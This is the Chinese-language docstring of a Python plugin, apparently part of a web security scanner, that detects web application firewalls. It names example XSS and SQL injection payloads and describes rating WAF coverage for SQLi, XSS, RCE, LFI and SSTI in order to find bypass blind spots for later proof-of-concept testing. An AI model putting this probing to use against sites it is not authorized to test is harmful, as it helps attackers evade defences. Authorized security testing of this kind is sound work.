"""
plugins/info/waf_check.py — WAF / Web 防火墙探测 + 多维敏感度热力图

检测逻辑：
  1. 发送包含经典攻击 payload 的请求 (<script>, ' OR 1=1--, etc.)
  2. 分析响应状态码 (403 / 406 / 501 / 999)
  3. 分析响应头指纹 (Server, X-Powered-By, 自定义头)
  4. 分析响应 body 中的拦截页关键词
  5. 匹配已知 WAF 指纹库

企业级增强 — 多维 WAF 敏感度热力图:
  • 不再只是 "检测到/未检测到" 的二元判定
  • 量化评估 WAF 对 SQLi, XSS, RCE, LFI, SSTI 等维度的防护水位
  • 生成防御能力矩阵 (Capability Matrix)
  • 识别 WAF 的绕过盲区，为后续 POC 测试提供策略指导

支持检测的 WAF:
  Cloudflare, ModSecurity, Safedog, Imperva/Incapsula,
  Akamai, AWS WAF, Barracuda, Fortinet, 360, 宝塔 等
"""

